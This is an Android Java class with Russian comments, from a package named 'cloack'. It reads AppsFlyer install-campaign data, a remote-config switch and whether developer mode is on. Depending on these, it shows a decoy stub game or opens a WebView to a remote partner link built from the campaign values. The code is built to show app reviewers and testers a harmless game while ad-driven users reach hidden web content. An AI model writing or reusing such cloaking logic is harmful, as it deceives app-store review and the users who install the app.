

package com.guide.webview.cloack.appsflyer;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.provider.Settings;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.guide.webview.webview.partner.PartnersActivity;
import  com.guide.webview.zaglushka.activities.GameStartMenuActivity;

import java.util.Map;

/**
 * Класс отвечает за: инициализацию appsFlyer, формирование ссылки, органическую и неорганическую установки
 */
public class AppsFlyerCheck {
    private Activity activity;
    private Context context;
    private int development_setting;
    private int doubleOpen;// переменная не позволяет дважды открывать appsFlyer
    private String domen, secondSwitch;

    public AppsFlyerCheck(Activity activity, Context context, String secondSwitch, String domen) {
        this.domen = domen;// ссылка из remoteConfig
        this.secondSwitch = secondSwitch;// переключатель из remoteConfig
        this.activity = activity;
        this.context = context;
        doubleOpen = 1;// задаем ей начальное значение
        development_setting = Settings.Secure.getInt(context.getContentResolver(), "development_settings_enabled", 0);
        AppsFlyerLib.getInstance().init("n3aZSQFnXibEVk7koMchKb", myConversionListener(), context);// инитим слушатель конверсий
        AppsFlyerLib.getInstance().start(activity);// запускаем appsFlyer
    }

    /**
     * Этот метод возвращает AppsFlyerConversionListener в который приходят данные после установки приложения по специальной ссылке.
     * Данные содержаться в map
     * map содержит ключевой параметр campaign (naming)
     */
    public AppsFlyerConversionListener myConversionListener() {
        return new AppsFlyerConversionListener() {
            @Override
            public void onConversionDataSuccess(Map<String, Object> map) {
                if (doubleOpen == 0) {// наш параметр для отключения двойного срабатывания appsFlyer (это баг самого сервиса)
                    // если = 0, то ничего не делаем
                    return;
                } else {// если = 1, то обрабатываем map
                    doubleOpen = 0;// сразу задаем значение 0, что бы appsFlyer не сработал дважды
                    switch (secondSwitch) {// переключатель из remoteConfig
                        case "true":// если он true органика включена
                            checkOrganicInstall(map);
                            break;
                        case "false":// если он false органика выключена
                            checkNoneOrganicInstall(map);
                            break;
                    }
                }
            }


            @Override
            public void onConversionDataFail(String s) {

            }

            @Override
            public void onAppOpenAttribution(Map<String, String> map) {

            }

            @Override
            public void onAttributionFailure(String s) {

            }
        };
    }

    public void checkNoneOrganicInstall(Map<String, Object> map) {
        if (isContainCampaign(map)) {//если campaign нет, открываем заглушку
            openGame();// открываем заглушку
        } else {// campaign есть
            createAdress(String.valueOf(map.get("campaign")));// формируем ссылку
        }
    }

    public void checkOrganicInstall(Map<String, Object> map) {
        if (isContainCampaign(map)) {// проверяем если ли campaign
            // если campaign нет, то проверяем включен ли режим разработчика на устройстве пользователя
            if (development_setting == 1) {//  1= значит включен режим разраба
                openGame();// открываем заглушку
            } else {// 0= значит не включен режим разраба
                createAdress(String.valueOf(map.get("campaign")));// формируем ссылку
            }
        } else {// campaign есть
            createAdress(String.valueOf(map.get("campaign")));// формируем ссылку
        }
    }

    /**
     * Формируем ссылку партнера
     *
     * @param campaign - параметр из map
     */
    public void createAdress(String campaign) {
        if (isCampaignEmpty(campaign)) {// если кампания есть, но она пустая, null, none снова проверяем режим разработчика
            if (development_setting == 1) {//  1= значит включен режим разраба
                openGame();// открываем заглушку
            } else {// 0 = значит режим разраба выключен
                // открываем webView с сформированной ссылкой
                Intent intent = new Intent(activity, PartnersActivity.class);
                intent.putExtra("urlCampaign", domen);// загружаем ссылку без кампании
                activity.startActivity(intent);
            }
        } else {// если кампания есть и она не пустая,не null,не none, открываем webview с сформированной ссылкой
            Intent intent = new Intent(activity, PartnersActivity.class);
            intent.putExtra("urlCampaign", domen.concat(splitCampa(campaign)));// формируем ссылку
            activity.startActivity(intent);
        }
        activity.finish();
    }

    /**
     * Формирование ссылки
     *
     * @param campa
     * @return
     */
    public String splitCampa(String campa) {
        StringBuilder formedCampa = new StringBuilder();
        String[] campaElements = campa.split("_");// делим campaign по символу "_"
        formedCampa.append("&pid=").append(campaElements[0]);// к первому элементу добавляем "&pid="
        for (int i = 1; i < campaElements.length; i++) {// к остальным элементам "&sub="
            formedCampa.append("&sub").append(i).append("=").append(campaElements[i]);
        }
        // в конце получаем ссылку вида:https://sweetyboom.fun/volcanoadventure?hash=hgfredfrgthy534256754&pid=somepid&sub1=test1&sub2=test2&sub3=test3
        return formedCampa.toString();
    }

    /**
     * Проверяем campaign на null, none, ""
     *
     * @param param
     * @return
     */
    public boolean isCampaignEmpty(String param) {
        //так как campaign может прийти в верхнем регистре приводим все в нижний или верхний регистр
        // проверка switch выбрана для уникализации
        switch (param.toLowerCase()) {
            case "null":
            case "none":
            case "":
                return true;
            default:
                return false;
        }
    }


    /**
     * Открываем заглушку
     */
    public void openGame() {
        Intent intent = new Intent(activity, GameStartMenuActivity.class);
        activity.startActivity(intent);
        activity.finish();
    }

    /**
     * Метод проверяет содержит ли вообще map параметр campaign
     *
     * @param map
     * @return
     */
    public boolean isContainCampaign(Map<String, Object> map) {
        return !map.containsKey("campaign");

    }
}
